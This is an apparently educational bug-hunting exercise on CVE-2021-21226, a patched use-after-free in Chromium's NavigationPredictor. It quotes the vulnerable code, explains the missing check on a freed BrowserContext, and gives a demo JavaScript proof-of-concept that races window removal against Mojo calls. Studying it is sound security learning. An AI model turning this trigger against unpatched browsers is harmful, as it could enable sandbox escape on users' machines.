# Exercise 1

In LEVEL 1, we can relay on Details and just to search for the func which Details mentioned. It is far away from the real bug hunting scene.

LEVEL 2 we do the same as LEVEL 1 without the help of Details.

But the bug report need Poc to assist developer reproduce the vulnerability, and know exactly what cause this bug. So LEVEL 3 need we construct Poc by ourselves.

## CVE-2021-21226
I sugget you don't search any report about it to prevents get too much info like patch.



### Details

In level 3, we do it without the help of Details


---------

<details>
  <summary>For more info click me! But you'd better not do this</summary>

  https://bugs.chromium.org/p/chromium/issues/detail?id=1197904

</details>

--------

### Set environment

after you fetch chromium
```sh
git reset --hard f65d388c65bafd029be64609eb5e29243376f8ed
```


### Related code
chrome/browser/navigation_predictor/navigation_predictor.cc


### Do it
Do this exercise by yourself, If you find my answer have something wrong, please correct it.


---------

<details>
  <summary>My answer</summary>

  ```c++
  // It is possible for this class to still exist while its WebContents and
  // RenderFrameHost are being destroyed. This can be detected by checking
  // |web_contents()| which will be nullptr if the WebContents has been
  // destroyed.
  ```
  By this comment, we can get if we need do some by `browser_context_` we need check whether web_contents_ alive to provent UAF.

  ```c++
  // This class gathers metrics of anchor elements from both renderer process
// and browser process. Then it uses these metrics to make predictions on what
// are the most likely anchor elements that the user will click.
class NavigationPredictor : public blink::mojom::AnchorElementMetricsHost,
                            public content::WebContentsObserver,
                            public prerender::NoStatePrefetchHandle::Observer {
 public:
  explicit NavigationPredictor(content::WebContents* web_contents);
  ~NavigationPredictor() override;
  // [ ... ]
   private:
  // Used to get keyed services.
  content::BrowserContext* const browser_context_;   // raw ptr
  ```
  > Previously, it was possible for the BrowserContext to be destroyed
  before ReportAnchorElementMetricsOnClick attempted to access it.
  > 
  > The fix uses the fact that NavigationPredictor extends
  WebContentsObserver and checks that web_contents is still alive
  before dereferencing BrowserContext. WebContents will always
  outlive BrowserContext.

  **Poc**
  Because this cve is about mojo and can make sandbox escape, so we need some knowledge about how bind mojo interface. You can read [offical doc](https://chromium.googlesource.com/chromium/src/+/HEAD/mojo/public/js/README.md#interfaces) or other chrome ctf challenge wp(recommend)

  We just need call `ReportAnchorElementMetricsOnClick` after remove window by race.
  ```c++
void NavigationPredictor::ReportAnchorElementMetricsOnClick(
    blink::mojom::AnchorElementMetricsPtr metrics) {
  DCHECK_CALLED_ON_VALID_SEQUENCE(sequence_checker_);
  DCHECK(base::FeatureList::IsEnabled(blink::features::kNavigationPredictor));

  if (browser_context_->IsOffTheRecord())        [1]
    return;

  if (!IsValidMetricFromRenderer(*metrics)) {
    mojo::ReportBadMessage("Bad anchor element metrics: onClick.");
    return;
  }
[ ... ]
  ```
  [1] has no check whether the `browser_context_` has been freed, so we can remove the window then call `ReportAnchorElementMetricsOnClick` to trigger uaf.

  The following code is just a demo, you can get complete code [here](https://bugs.chromium.org/p/chromium/issues/detail?id=1197904)
  ```js
async function poc() {
  // call ReportAnchorElementMetricsOnClick for mulipy
	let win1 = await createWindow({url: "https://localhost:8080/child.html", incognito: true});
  
  // remove the window
	setTimeout(function() {
		removeWindow(win1.id);
	}, 1200);
}

// in child.html
async function posttask() {
    const MAX = 65536;
    for(var i = 0 ; i < MAX; i++){
      // call ReportAnchorElementMetricsOnClick to trigger uaf
        anchor_ptr.reportAnchorElementMetricsOnClick(anchor_elements);
    }
}

setTimeout(function() {
    posttask();
}, 1000);
  ```

  we trigger race by `setTimeout`


</details>

--------
